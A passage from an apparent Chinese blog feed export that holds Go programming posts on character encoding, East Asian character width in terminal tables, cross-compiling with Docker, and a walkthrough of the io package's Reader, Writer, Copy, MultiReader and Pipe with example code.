FF来实现的。在不同字节序的文档中，它会被显示成FF FE或者FE FF，清楚的把这篇文档的字节序告诉了解释器。 BOM尽管很有用，但并不是很简洁，因为还有一个类似的概念，称作「魔术字」(Magic Byte)，很多年来一直被用来表明文件的格式。BOM和魔术字间的关系一直没有被清楚的定义过，因此有的解释器会搞混它们。 常见的编码引起的问题我们看到的任何输出，都是程序展示我们的，程序根据编码来进行这个映射关系的转换，如果程序把这编码搞错了，就会出现乱码问题当软件不能确定编码的时候，它会猜测。大部分时候，它会猜测是否是涵盖了ASCII码的UTF-8，还是ISO-8859-1，也有可能猜其他能想到的任意字符集。因为英文中使用的拉丁字母表在几乎所有的字符集中都能显示，包括UTF-8，所以即使编码猜错了，英文字母看起来也是正确的。 浏览器乱码问题如果你在浏览网页时看到�符号，这意味着这个网页的编码不是你的浏览器猜测的那个。这时你可以点开浏览器的查看-&gt;字符编码菜单来尝试不同的编码。 对于程序开发者来说，因避免让浏览器 猜测文档的编码，因此： 永远记得通过Content-Type或者meta charset标签来显式指定你的文档的编码。这样浏览器就不需要猜测你使用的编码了，他们会准确的使用你指定的编码来渲染文档。 编辑器乱码问题例如 我用 vim 打开一个 utf8 编码的文件：通过输入 set encoding ，会发现此时编辑器 使用的编码是 latin1通过 set encoding=utf8 ，把编码转换过来如果想这个配置永久生效 ，请写入vim 的配置文件吧 Xshell 虚拟终端乱码问题我在xshell终端下 tail 一个utf8 编码的文件，这个命令取得的结果会送到 Xshell 终端 ，然后有Xshell 终端进行解码，展示在我们面前原本的数据 是utf8编码的，但是我们终端 却选用Arabic 来进行解码，所以乱码现在我们将Xshell 的编码换成 utf8 总结编码表 就是一张映射表，不同的编码有自己的映射规则12数据 ——–&gt; 二进制 （软件来编码）二进制 ——–&gt; 数据 （软件来解码） 如果编码和解码不是同一种编码，那么就会出现乱码，这个加密解码一个道理]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[golang获取字符的宽度(East_Asian_Width)]]></title>
      <url>%2F2017%2F05%2F10%2Fgolang-char-width%2F</url>
      <content type="text"><![CDATA[最近在用golang写CLI, 数据在终端以Table方式展示和MySLQ输出的表格一样, 使用的是一个GitHub上不怎么出名的项目, 因为该项目逻辑清晰, 功能也完善, 自己也能很好的看懂, 容易维护, 但是前些天出了一个问题: 录入中文字符和一些特殊字符过会让Table无法对齐, 我已经fork过来修复了, 但是其中涉及到的知识点, 想通过这篇博客来讲清楚。 问题我使用一个叫simpletalbe的库: GitHub地址, 我使用他的例子, 添加了一行中文输入，结果是这样的:123456789101112131415161718Default style+----+------------------+--------------+-----------------------------+------+| # | NAME | PHONE | EMAIL | QTTY |+----+------------------+--------------+-----------------------------+------+| 1 | Newton G. Goetz | 252-585-5166 | NewtonGGoetz@dayrep.com | 10 || 2 | Rebecca R. Edney | 865-475-4171 | RebeccaREdney@armyspy.com | 12 || 3 | John R. Jackson | 810-325-1417 | JohnRJackson@armyspy.com | 15 || 4 | Ron J. Gomes | 217-450-8568 | RonJGomes@rhyta.com | 25 || 5 | Penny R. Lewis | 870-794-1666 | PennyRLewis@rhyta.com | 5 || 6 | Sofia J. Smith | 770-333-7379 | SofiaJSmith@armyspy.com | 3 || 7 | Karlene D. Owen | 231-242-4157 | KarleneDOwen@jourrapide.com | 12 || 8 | Daniel L. Love | 978-210-4178 | DanielLLove@rhyta.com | 44 || 9 | Julie T. Dial | 719-966-5354 | JulieTDial@jourrapide.com | 8 || 10 | Juan J. Kennedy | 908-910-8893 | JuanJKennedy@dayrep.com | 16 || 11 | 中文夹渣 abc | 特殊字符夹渣 ℃ | JuanJKennedy@dayrep.com | 16 |+----+------------------+--------------+-----------------------------+------+| Subtotal | 166 |+----+------------------+--------------+-----------------------------+------+ 仔细观察可以发现问题, 一个中文的宽度是2个英文字符的宽度,但是他却依然使用1个宽度来计算, 致使实际字符的宽度少算了4位, 所以第一个Name表格字符多出去了4个字符宽度。 这个问题的本质是一个编码问题, 由于Golang内部字符统一使用Unicode编码, 所以问题定位为 unicode 编码的字符宽度问题, 该问题和语言无关, 只要你使用unicode 就会有这个问题, 顺着这个问题 我们来说明Golang的中的字符类型Rune Golang中的Rune类型在python中一个字符以char类型表示, 而在Golang中字符类型以Rune表示, 注意字符通过码表(code point)来进行翻译, 所以字符串是码表翻译过来拼接而成的, 所以不要傻傻搞不清楚rune和string的区别。 golang里面用 “” 表示字符串, 用户``表示多行字符串, ‘’表示字符, 比如:1234a := "字符串"b := `多行字符串`c := '中' 该网站有unicode的码位表: unicode-utf8-table, 我们从中找出一部分来做测试: 我们以打印下4e07为例来 验证下code point:1234func main() &#123; fmt.Printf("%c\n", 0x4e07) fmt.Printf("%x\n", '万')&#125; 关于字符宽度编码之战始于Ascii码空余的第8位, 最终以unicode统一 这是一场惊心动魄的历史, 我在之前篇运维的博客中有过介绍, 当时花了1个星期撸编码问题, 后面会将其转过来(买的VPS快到期了)。 关于编码介绍: 编码之战 有了上面的基础, 我们继续字符宽度的问题, 文章标题含有:East_Asian_Width, 这个东西很重要, 它在unicode标准中负责定义字符的宽度。让我们由浅入深的开始介绍。 截止我写这篇博客之时, unicode规范的稳定版是第9版，开发版是第10版, 我主要参考unicode9规范的文档。 在unicode9中的技术报告中有关于 unicode标准的所有的规范: Unicode Technical Reports , 其中 Unicode Standard Annexes 描述了unicode所有相关规范，其中这2个规范需要我们关注: UNICODE CHARACTER DATABASE: 用于描述码表(code point), 既Unicode字符数据库(UCD),它描述了Unicode字符数据库的布局和组织，以及它如何指定Unicode字符属性的形式化定义. EAST ASIAN WIDTH: 用于描述东亚传统字符集的信息属性的规范, 其中就包括字符宽度.在UCD规范中, unicode字符有一个East_Asian_Width属性(5.11.1描述了二进制属性),定义了一个unicode字符可能出现的字符宽度。12345678# East_Asian_Width (ea)ea ; A ; Ambiguousea ; F ; Fullwidthea ; H ; Halfwidthea ; N ; Neutralea ; Na ; Narrowea ; W ; Wide 其中除A不确定外，F/H/N/Na/W都能很明确的知道宽度。因此每一个unicode字符我们只需要知道其East_Asian_Width属性的值 就可知道其字符的宽度, 但是查看了下Golang unicode标准库, 并没有发现East_Asian_Width相关属性的实现和方法, 因此估计需要自己实现了。 如何实现East_Asian_Width喃?, 这就需要刚才提到的unicode规范中的另外一个规范EAST ASIAN WIDTH, 该文档整理出了所有的unicode字符的宽度的范围表, 该规范的 6.3节中 给出了这个范围表unicode字符宽度范围表,只要有这张表我们就可以知道字符宽度。 因此我们根据这张范围表可以实现一个获取unicode字符宽度的功能模块, 默认F/W为Fullwidth, 其他为Halfwidth, 该模块具体代码见: east_asian_width, 有了这个模块我们就可以来解决 字符宽度问题了 解决字符宽度问题我们找到simpletalbe里面关于字符长度的代码:123456789101112131415// width returns content widthfunc (c *content) width() int &#123; m := c.maxLinewidth() if m &gt; c.w &#123; return m &#125; return c.w&#125;// line formats content linefunc (c *content) line(l string, a int) string &#123; len := c.width() - utf8.RuneCountInString(l) ...&#125; 我们定义好获取字符长度的函数，提供掉他的判断方法123456789101112131415161718192021222324252627282930313233343536// get the string widthfunc getStringWidth(str string) int &#123; w := 0 for _, c := range []rune(str) &#123; if IsHalfwidth(c) &#123; w = w + 1 &#125; else &#123; w = w + 2 &#125; &#125; return w&#125;// width returns maximum content lines widthfunc (c *content) maxLinewidth() int &#123; w := 0 for _, r := range c.c &#123; l := getStringWidth(r) if l &gt; w &#123; w = l &#125; &#125; return w&#125;// line formats content linefunc (c *content) line(l string, a int) string &#123; len := c.width() - getStringWidth(l) ...&#125; 然后测试效果123456789101112131415161718Default style+----+------------------+----------------+-----------------------------+------+| # | NAME | PHONE | EMAIL | QTTY |+----+------------------+----------------+-----------------------------+------+| 1 | Newton G. Goetz | 252-585-5166 | NewtonGGoetz@dayrep.com | 10 || 2 | Rebecca R. Edney | 865-475-4171 | RebeccaREdney@armyspy.com | 12 || 3 | John R. Jackson | 810-325-1417 | JohnRJackson@armyspy.com | 15 || 4 | Ron J. Gomes | 217-450-8568 | RonJGomes@rhyta.com | 25 || 5 | Penny R. Lewis | 870-794-1666 | PennyRLewis@rhyta.com | 5 || 6 | Sofia J. Smith | 770-333-7379 | SofiaJSmith@armyspy.com | 3 || 7 | Karlene D. Owen | 231-242-4157 | KarleneDOwen@jourrapide.com | 12 || 8 | Daniel L. Love | 978-210-4178 | DanielLLove@rhyta.com | 44 || 9 | Julie T. Dial | 719-966-5354 | JulieTDial@jourrapide.com | 8 || 10 | Juan J. Kennedy | 908-910-8893 | JuanJKennedy@dayrep.com | 16 || 11 | adfsb“ | 特殊字符夹渣 ℃ | JuanJKennedy@dayrep.com | 16 |+----+------------------+----------------+-----------------------------+------+| Subtotal | 166 |+----+------------------+----------------+-----------------------------+------+]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[如何使用容器build多平台golang程序]]></title>
      <url>%2F2017%2F05%2F08%2Fbuild-goapp-with-docker%2F</url>
      <content type="text"><![CDATA[在CI和CD环境中, goalng源码程序往往需要build不同平台的二进制程序, 这时候使用容器是一个不错的选择, 因为build完成后,我们可以立即释放容器, 而且也保证了build环境的干净。 基于容器的build使用容器来进行build, 所遇到的一些小坑。 问题我们采用vendor来做golang项目的依赖管理, build的docker镜像拉取的官方的golang官方镜像, 按照镜像的使用说明:1$ docker run --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp golang:1.6 go build -v 但是却没有成功, 我项目下面的vendor的依赖并没有被go找到。 解决办法在各种google之后也没找到原因。仔细观察官方的示例才发现，使用vendor功能时包都在$GOPATH/src下，测试了一下，果然是这样。只有在$GOPATH/src下的包，才能使用vendor目录存放依赖包。 现在go对不在$GOPATH/src下开发的项目限制越来越多，所以解决办法就很明显了, 将项目挂到GOPATH的src下面, 查下镜像的后发现GOPATH就是/go，所以解决办法是这样1$ docker run --rm -v "$PWD":/go/src/myapp -w /go/src/myapp golang:1.6 go build -v 注意 将myapp替换成你项目真正的名称。 多平台打包通过在docker中进行交叉编译，产出各种平台的二进制文件。 本地编译简单来讲，本地编译就是以 本地环境作为软件运行的目标环境来进行 程序的编译, 因此如果你本地环境是Mac，那么就只能编译darwin平台的，如果你本地是Linux就只能编译出Linux平台的。如果你需要发布多种平台的软件，那么你就需要准备多种环境, 来进行分别build, 这是极其不便的。 而且对于一些嵌入式设备而言，其性能有限, 比如低配的ARM平台, 很多情况下无法胜任本地编译。 但是本地编译也有他的优点: 本地环境的原生性，有助于保障程序编译后的稳定性和可靠性, 因此本地编译是最可靠的一种手段。 交叉编译简单地说，就是在一个平台上生成另一个平台上的可执行程序, 所以带来了很大的方便性, 不用准备那么多平台的环境了。 要进行交叉编译, 那么必须准备好交叉编译的环境, 交叉编译环境一般由 交叉编译器和工具包组成, 如果你使用c/c++那么你需要 下载集成好的交叉编译环境，也可以自己制作 （比较复杂，建议读者下载集成好的交叉编译环境）, 但是这些Golang早已经看穿了, 在Golang的工具链上已经集成好了, 因此直接使用即可。 接下来介绍Golang中的交叉编译。 Golang中的交叉编译Golang的交叉编译依赖2个环境变量的控制: $GOARCH 目标平台（编译后的目标平台）的处理器架构（386、amd64、arm） $GOOS 目标平台（编译后的目标平台）的操作系统（darwin、freebsd、linux、windows） 交叉编译的系统要求: OS ARCH OS version linux 386/amd64/arm &gt;= Linux 2.6 darwin 386/amd64 OS X (Snow Leapard + Lion) freebsd 386/amd64 &gt;= FreeBSD 7 windows 386/amd64 &gt;= Windows 2000 进行交叉编译(尽量减少依赖,方便直接放入docker运行, 所以编译时禁用的CGO):123456789# 如果你想在Windows 32位系统下运行$ CGO_ENABLED=0 GOOS=windows GOARCH=386 go build# 如果你想在Windows 64位系统下运行$ CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build# 如果你想在Linux 32位系统下运行$ CGO_ENABLED=0 GOOS=linux GOARCH=386 go build# 如果你想在Linux 64位系统下运行$ CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Golang IO系列(一) - 基本的IO接口]]></title>
      <url>%2F2017%2F05%2F06%2Fgolang-io%2F</url>
      <content type="text"><![CDATA[在Golang开发过程中零零散散会遇到各种IO操作, 每次百度Google也能解决, 大概用法也还是清楚, 但是缺少系统性的全面了解, 也搞不清楚, 使用哪个方式才是最优的, 因此打算全面读一遍标准库中与io相关的源码, 总结成一系列的博客。 这一系列这是这一系列的一个开篇, 主要讲标准库中的一些io相关, 整个系列打算写7篇: 基础篇 基本的IO接口(io) 高级的IO接口(ioutil) IO的格式化(fmt) IO的缓冲(bufio) 运用篇 字符串操作(strings.Reader) 字节操作(bytes.buffer) 文件操作(os.File) IO的概念IO在计算机中指Input/Output，也就是输入和输出。由于程序和运行时数据是在内存中驻留，由CPU这个超快的计算核心来执行，涉及到数据交换的地方，通常是磁盘、网络等，就需要IO接口。各种语言一般都会提供IO库供开发者使用。Go语言也不例外。Input指往内存中读取数据, 比如读取文件, 读取服务器响应的网络数据, 在Golang的IO接口中主要以Reader来完成。Outout指从内存中往外发送数据, 比如将数据保存回磁盘的文件, 作为服务端时，返回客户需要的数据, 在Golang的IO接口中主要以Writer来完成。在IO编程中，还有一个很重要的概念:Stream(流), 可以把流想象成一个水管，数据就是水管里的水，但是只能单向流动。Input Stream就是数据从外面（磁盘、网络）流进内存，Output Stream就是数据从内存流到外面去。而像水管这样的东西，在不同语言里基本都有一个一样的名称:pipe, Golang中关于pipe的一些功能函数都定义在这个文件里面。 IO包的文件不要有恐惧心理, IO标准库的代码量其实并不多, 除去test和example, 剩下的模块其实就5个(io.go, multi.go, pipe.go, ioutil.go, tempfile.go), 总共也才千余行代码，而且还有将近一半是注释。1234567891011121314151617➜ io tree ..├── example_test.go├── io.go├── io_test.go├── ioutil│ ├── example_test.goF│ ├── ioutil.go│ ├── ioutil_test.go│ ├── tempfile.go│ └── tempfile_test.go├── multi.go├── multi_test.go├── pipe.go└── pipe_test.go1 directory, 12 files 这篇博客主要关注io.go，multi.go, pipe.go 3个文件。 从IO包的注解开始讲起io包为I/O原语提供了基本的接口。它主要功能是包装了这些原语的已有实现, 这个描述得有点绕, 直白来说: IO表示的是一个过程(输入与输出), IO包就是将输入与输出的规范定义清楚(一些通用的接口和函数), 而具体的输入什么,输出什么, 是由具体的对象来实现,比如后面应用时需要讲到的strings, bytes, file等。由于这些接口和原语以不同的实现包装了低级操作，因此除非另行通知，否则客户端不应假定它们对于并行执行是安全的。 io.go源码分析我们先从IO包的核心文件io.go开始读起, 该文件主要定义了单路读写的相关规范 基础IO接口的定义基础接口涉及到读，写，关闭，以及指针位置这4个方面。 Reader: 数据读取的方法: Read, 如果对象是一个Reader对象,那么我们就能调用Read读取其中的数据。 ReadAt: 从偏移量off处开始读取数据的方法: ReadAt ReaderFrom: 从一个Reader对象中读入数据: ReaderFrom, 方便对象之间的数据读取。 Writer: 定义了数据写入的方法: Write, 如果对象是一个Writer对象, 那么我们就能调用Write往该对象写入数据。 WriterAt: 从偏移量off处开始写入数据的方法: WriterAt WriterTo: 往一个Writer对象中写入数据: WriterTo, 方便对象之间的数据写入。 Closer: 定义了关闭数据流的方法。 Seeker: 定义设置读写时 偏移量(偏移指针)的值。 读接口和函数1234567891011type Reader interface &#123; Read(p []byte) (n int, err error)&#125;type ReaderAt interface &#123; ReadAt(p []byte, off int64) (n int, err error)&#125;type WriterTo interface &#123; WriteTo(w Writer) (n int64, err error)&#125; Read: 将len(p)个字节读取到p中。它返回读取的字节数n（0 &lt;= n &lt;= len(p)）以及任何遇到的错误, 也就是说，当Read方法返回错误时，不代表没有读取到任何数据。调用者应该处理返回的任何数据，之后才处理可能的错误。 ReadAt: 从基本输入源的偏移量off处开始，将len(p)个字节读取到p中。它返回读取的字节数n（0 &lt;= n &lt;= len(p)）以及任何遇到的错误。 WriterTo: 将数据写入w中，直到没有数据可写或发生错误。其返回值n为写入的字节数。 在写入过程中遇到的任何错误也将被返回, 这个和ReadFrom对比着看, ReadFrom从Reader对象中直接读取数据，而WriterTo可以直接往一个Writer中写入数据.strings的reader实现了这3个接口，以他为例,具体可以参考strings reader的源码.1234567891011121314151617181920212223242526272829package mainimport ( "fmt" "os" "strings")func main() &#123; content := "example for io.Read, io.ReadAt, io.WriteTo" reader := strings.NewReader(content) read := make([]byte, 50) readAt := make([]byte, 50) // 通过Read读取所有数据,如果读取完成，读指针已经移到最后 // 通过Len可以知道还剩多少没读，因为指针位置Reader没有实现暴露 reader.Read(read) fmt.Println("read:", string(read)) fmt.Println("unread:", reader.Len()) // 通过ReadAt从第9个字符开始读取,但是没有移到读指针的位置(io.ReadAt的规范) reader.ReadAt(readAt, 8) fmt.Println("readAt:", string(readAt)) // 由于读指针已经移到最后, 所以需要恢复 // 将reader的数据直接输出给writer, reader.Seek(0, 0) reader.WriteTo(os.Stdout)&#125; 跟Reader有关的函数:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162// LimitReaderfunc LimitReader(r Reader, n int64) Reader &#123; return &amp;LimitedReader&#123;r, n&#125; &#125;type LimitedReader struct &#123; R Reader // underlying reader N int64 // max bytes remaining&#125;func (l *LimitedReader) Read(p []byte) (n int, err error) &#123; if l.N &lt;= 0 &#123; return 0, EOF &#125; if int64(len(p)) &gt; l.N &#123; p = p[0:l.N] &#125; n, err = l.R.Read(p) l.N -= int64(n) return&#125;// TeeReaderfunc TeeReader(r Reader, w Writer) Reader &#123; return &amp;teeReader&#123;r, w&#125;&#125;type teeReader struct &#123; r Reader w Writer&#125;func (t *teeReader) Read(p []byte) (n int, err error) &#123; n, err = t.r.Read(p) if n &gt; 0 &#123; if n, err := t.w.Write(p[:n]); err != nil &#123; return n, err &#125; &#125; return&#125;// ReadAtLeastfunc ReadAtLeast(r Reader, buf []byte, min int) (n int, err error) &#123; if len(buf) &lt; min &#123; return 0, ErrShortBuffer &#125; for n &lt; min &amp;&amp; err == nil &#123; var nn int nn, err = r.Read(buf[n:]) n += nn &#125; if n &gt;= min &#123; err = nil &#125; else if n &gt; 0 &amp;&amp; err == EOF &#123; err = ErrUnexpectedEOF &#125; return&#125;// ReadFullfunc ReadFull(r Reader, buf []byte) (n int, err error) &#123; return ReadAtLeast(r, buf, len(buf))&#125; LimitReader: 返回一个LimitReader结构体, 从R读取但将返回的数据量限制为N字节。每调用一次Read都将更新N来反应新的剩余数量。如果你的读buf大于限制的长度, 将一次读取完, 如果你的buf小于限制长度, 则只有多次循环读取, 从而起到限制读取的作用。 1234567891011121314151617181920212223package mainimport ( "fmt" "io" "strings")func main() &#123; content := "This is limitReader example" reader := strings.NewReader(content) i := 1 // 不做限制，读取所有的内容 limitReader := &amp;io.LimitedReader&#123;R: reader, N: int64(len(content))&#125; for limitReader.N &gt; 0 &#123; // 限制性读取, 一次读取4字节 tmp := make([]byte, 4) limitReader.Read(tmp) fmt.Printf("第%d次: %s\n", i, tmp) i++ &#125;&#125; TeeReader: 返回一个 Reader，它将从r中读到的数据写入w中。所有经由它处理的从r的读取都匹配于对应的对w的写入。它没有内部缓存，即写入必须在读取完成前完成。任何在写入时遇到的错误都将作为读取错误返回,也就是说，我们通过Reader读取内容后，会自动写入到Writer中去 12345678910111213141516171819202122232425262728293031package mainimport ( "fmt" "io" "os" "strings")func main() &#123; var ( err error nn int n int ) content := "This is teeReader example\n" // 复制一份流到标准输出 reader := io.TeeReader(strings.NewReader(content), os.Stdout) p := make([]byte, len(content)) n, err = reader.Read(p) // 读完数据 for err != io.EOF &#123; nn, err = reader.Read(p[n:]) n += nn fmt.Printf("my read: %s", string(p))&#125; ReadAtLeast:将r读取到buf中，直到读了最少min个字节为止,因此buf必须大于最小字节数,不然就会报错(buf小了), 这个和LimitReader功能类似, 但是 ReadFull: 精确地从r中将len(buf)个字节读取到buf中,将buf读满, 实际上ReadFull就是调用的ReadAtLeast来将buf填满的,12345678910111213141516171819202122package mainimport ( "fmt" "io" "log" "strings")func main() &#123; content := "This is readFull example\n" p := make([]byte, len(content)) _, err := io.ReadFull(strings.NewReader(content), p) if err != nil &#123; log.Fatal(err) &#125; fmt.Printf("my read: %s", string(p))&#125; 写接口和函数1234567891011type Writer interface &#123; Write(p []byte) (n int, err error)&#125;type ReaderFrom interface &#123; ReadFrom(r Reader) (n int64, err error)&#125;type WriterAt interface &#123; WriteAt(p []byte, off int64) (n int, err error)&#125; Writer: 将p中len(p)个字节的数据写入到基本数据流中, 它返回从p中被写入的字节数n（0 &lt;= n &lt;= len(p)）以及任何遇到的引起写入提前停止的错误. WriterAt: 和ReadAt相对，从p中将len(p)个字节写入到偏移量off处的基本数据流中,即从偏移量off处开始写入 ReadFrom: 函数将io.Reader作为参数，也就是说，ReadFrom可以从任意Reader对象中读取数据，只要来源实现了io.Reader接口。比如，我们可以从标准输入、文件、字符串等读取数据。bufio实现了Writer和ReadFrom, 没实现WriterAt, 我这里没扩展，因为Writer都在工厂模式的保护下，所有属性都没暴露，扩展起来不方便:12345678910111213141516171819202122232425262728293031package mainimport ( "bufio" "fmt" "os" "strings")func main() &#123; content := "example for io.Writer, io.ReadFrom" writer := bufio.NewWriter(os.Stdout) // 直接byte往标准输出写入 writer.Write([]byte(content)) writer.Flush() fmt.Println() // 为了方便其实也直接直接写入string writer.WriteString(content) writer.Flush() fmt.Println() // 从Reader中读出数据,然后再往标准输出写入 reader := strings.NewReader(content) writer.ReadFrom(reader) writer.Flush()&#125; 跟Writer有关的函数:123456func WriteString(w Writer, s string) (n int, err error) &#123; if sw, ok := w.(stringWriter); ok &#123; return sw.WriteString(s) &#125; return w.Write([]byte(s))&#125; WriteString: 将字符串内容写入到writer中, 如果writer实现了WriteString则直接调用它的方法写入,如果没有则直接调用Write处理成bytes写入, 具体上面已经有栗子了. 关闭与偏移量1234567891011121314type Closer interface &#123; Close() error&#125;// Seek whence values.const ( SeekStart = 0 // seek relative to the origin of the file SeekCurrent = 1 // seek relative to the current offset SeekEnd = 2 // seek relative to the end)type Seeker interface &#123; Seek(offset int64, whence int) (int64, error)&#125; Closer: 该接口比较简单，只有一个Close()方法，用于关闭数据流, 比如数据库连接, 文件等。 Seeker: 设置下一次Read或Write的偏移量(offset)，它的解释取决于 whence: 0表示相对于文件的起始处，1表示相对于当前的偏移，而2表示相对于其结尾处。 Seek返回新的偏移量和一个错误，如果有的话。也就是说，Seek方法用于设置偏移量的，这样可以从某个特定位置开始操作数据流。听起来和ReaderAt/WriteAt接口有些类似，不过Seeker接口更灵活，可以更好的控制读写数据流的位置。1234567891011121314151617181920212223242526package mainimport ( "fmt" "log" "strings")func main() &#123; content := "字Seek测试读取指定位置的字符" reader := strings.NewReader(content) // 读取倒数第5个字符, 由于string reader设计的原因 // 无论是ReadAt, WriteAt还是Seek这里面的offset // 都指的是byte个数, 并且index累加的也是byte,所以 // 就坑爹了，要取第5个字符实际上的byte位置是5*3 // 注意utf8 是变长编码的, 所以并不是所有的中文都是3字节哦! // 所有这种方式是有问题的, 还是以字符个数进行计算合适 reader.Seek(-15, 2) r, s, err := reader.ReadRune() if err != nil &#123; log.Fatal(err) &#125; fmt.Println(s) fmt.Printf("%c\n", r)&#125; 组合衍生的IO接口 ReadWriter ReadCloser WriteCloser ReadWriteCloser ReadSeeker WriteSeeker ReadWriteSeeker 这些都是基于上面单个接口组合而成, 理解上面的基础过会，这个就不多说了。 IO Copy相关这里主要介绍和Copy相关的函数:12345func CopyN(dst Writer, src Reader, n int64) (written int64, err error)func Copy(dst Writer, src Reader) (written int64, err error)func CopyBuffer(dst Writer, src Reader, buf []byte) (written int64, err error) CopyN: 将n个字节从src复制到dst. 它返回复制的字节数以及在复制时遇到的最早的错误. Copy: 将src复制到dst，直到在src上到达EOF或发生错误。它返回复制的字节数，如果有的话，还会返回在复制时遇到的第一个错误。 CopyBuffer: 相当于 Copy，只不 Copy 在执行的过程中会创建一个临时的缓冲区来中转数据，而 CopyBuffer 则可以单独提供一个缓冲区让多个复制操作共用同一个缓冲区，避免每次复制操作都创建新的缓冲区。如果 buf == nil，则 CopyBuffer 会自动创建缓冲区。 举一组栗子:12345678910111213141516171819202122232425262728293031package mainimport ( "fmt" "io" "os" "strings")func main() &#123; content := "Copy相关操作的测试\n" reader := strings.NewReader(content) writer := os.Stdout // copy 10 个字节4的Ascii和2个中文 io.CopyN(writer, reader, 10) fmt.Println() // 重置读指针,从新完成1次完整的copy reader.Seek(0, 0) io.Copy(writer, reader) // 创建一个32字节的缓存用于所有copy使用,不用再开辟临时缓存 buf := make([]byte, 32) r1 := strings.NewReader("CopyBuffer测试第一次\n") io.CopyBuffer(writer, r1, buf) r2 := strings.NewReader("CopyBuffer测试第二次\n") io.CopyBuffer(writer, r2, buf)&#125; Byte和Rune类型IO相关针对基础数据结构的IO读写,大概有如下几类:Byte, Rune, Section, 主要定义了如何读取一个字节和一个Unicode字符的规范, 一般地，我们不会使用bytes.Buffer来一次读取或写入一个字节, 但是在处理二进制数据和数据压缩时 这些接口用得比较多。 RuneReader: 读取单个UTF-8字符, 返回其rune和该字符占用的字节 RuneScanner: 相较于RuneReader而言, 仅增加了一个UnreadByt接口, UnreadByte方法的意思是：将上一次ReadByte的字节还原，使得再次调用ReadByte返回的结果和上一次调用相同，也就是说，UnreadByte是重置上一次的ReadByte。注意，UnreadByte调用之前必须调用了ReadByte，且不能连续调用UnreadByte。 ByteReader: 读一个字节. ByteWriter: 写一个字节. ByteScanner: 和RuneScanner类似, 只是针对的式Byte而已. 结构体 SectionReader: 这是用于读取磁盘扇区的接口, 由于基本不会使用到, 因此不做解读了. multi.go源码分析该文件主要定义了多路读写的相关规范,这里的多路指的是对多个reader或者多个writer同时的动作,它们接收多个Reader或Writer，返回一个Reader或Writer。我们可以猜想到这两个函数就是操作多个Reader或Writer就像操作一个。事实上，在io包中定义了两个非导出类型：mutilReader和multiWriter，它们分别实现了io.Reader和io.Writer接口123456789type multiReader struct &#123; readers []Reader&#125;type multiWriter struct &#123; writers []Writer&#125;func MultiReader(readers ...Reader) Reader func MultiWriter(writers ...Writer) Writer MultiReader: 逻辑上将多个Reader组合起来，返回一个新的Reader, 但是这个新Reader并不能通过调用一次Read方法获取所有Reader的内容。因为它这个逻辑真的特别简单, 循环读取所有的Reader, 读完一个返回一个, 只是正常读完过后的EOF被重置为nil, 这样的结果就是 我们还得在外面再次循环读取一次, 直到EOF1234567891011121314151617181920212223242526272829package mainimport ( "bytes" "fmt" "io" "strings")func main() &#123; readers := []io.Reader&#123; strings.NewReader("from strings reader\n"), bytes.NewBufferString("from bytes buffer\n"), &#125; reader := io.MultiReader(readers...) data := make([]byte, 0, 1024) // 循环读取每个reader返回的内容来拼接, // 直到所有reader读取后返回EOF停止 for n, err := 0, error(nil); err != io.EOF; &#123; tmp := make([]byte, 512) n, err = reader.Read(tmp) data = append(data, tmp[:n]...) &#125; fmt.Printf("%s", data)&#125; 像上面这样使用显然有点麻烦, 比较方便的使用方式还是聚合过后直接使用io.Copy来搞定12345678910111213141516171819package mainimport ( "bytes" "io" "os" "strings")func main() &#123; readers := []io.Reader&#123; strings.NewReader("from strings reader\n"), bytes.NewBufferString("from bytes buffer\n"), &#125; reader := io.MultiReader(readers...) io.Copy(os.Stdout, reader)&#125; MultiWriter: 和MultiReader类似, 将多个writer聚合都一个slice里面, 然后用for循环写, 实际上就是将向自身写入的数据同步写入到所有writers中1234567891011121314151617package mainimport ( "io" "os")func main() &#123; // 直接来2个writer writers := []io.Writer&#123; os.Stdout, os.Stderr, &#125; writer := io.MultiWriter(writers...) writer.Write([]byte("hello,world\n"))&#125; pipe.go源码分析该文件主要定义了流式IO的相关规范,主要就是Pipe, Pipe在内存中创建一个同步管道，用于不同区域的代码之间相互传递数据, 因此和无缓冲channel很像，因此不能在一个goroutine中进行读和写。同样 由于管道没有缓存区, 所以和channel一样 对于读写和关闭都是 并行安全的。123456789101112131415161718192021222324252627// A pipe is the shared pipe structure underlying PipeReader and PipeWriter.type pipe struct &#123; rl sync.Mutex // gates readers one at a time wl sync.Mutex // gates writers one at a time l sync.Mutex // protects remaining fields data []byte // data remaining in pending write rwait sync.Cond // waiting reader wwait sync.Cond // waiting writer rerr error // if reader closed, error to give writes werr error // if writer closed, error to give reads&#125;// A PipeReader is the read half of a pipe.type PipeReader struct &#123; p *pipe&#125;// A PipeWriter is the write half of a pipe.type PipeWriter struct &#123; p *pipe&#125;func Pipe() (*PipeReader, *PipeWriter) &#123; p := new(pipe) p.rwait.L = &amp;p.l p.wwait.L = &amp;p.l r := &amp;PipeReader&#123;p&#125; w := &amp;PipeWriter&#123;p&#125; return r, w&#125; PipeReader: 是管道的读取端。它实现了io.Reader和io.Closer接口，如果管道被关闭，则会返会一个错误信息： 如果写入端通过 CloseWithError 方法关闭了管道，则返回关闭时传入的错误信息。 如果写入端通过 Close 方法关闭了管道，则返回 io.EOF。 如果是读取端关闭了管道，则返回 io.ErrClosedPipe。 PipeWriter: 是管道的写入端。它实现了io.Writer和io.Closer接口, 如果管道被关闭，则会返会一个错误信息： 如果读取端通过 CloseWithError 方法关闭了管道，则返回关闭时传入的错误信息。 如果读取端通过 Close 方法关闭了管道，则返回 io.ErrClosedPipe。 如果是写入端关闭了管道，则返回 io.ErrClosedPipe。 Pipe: 它将io.Reader连接到io.Writer。一端的读取匹配另一端的写入，直接在这两端之间复制数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445package mainimport ( "fmt" "io" "log" "time")func main() &#123; Pipe()&#125;func Pipe() &#123; rPipe, wPipe := io.Pipe() go Read(rPipe) Write(wPipe) time.Sleep(2 * time.Second)&#125;func Write(pipeWriter *io.PipeWriter) &#123; _, err := pipeWriter.Write([]byte("Pipe 管道测试")) if err != nil &#123; log.Fatal(err) &#125; // 记得写入端关闭Pipe pipeWriter.CloseWithError(io.EOF) fmt.Println("写入完成")&#125;func Read(pipeReader 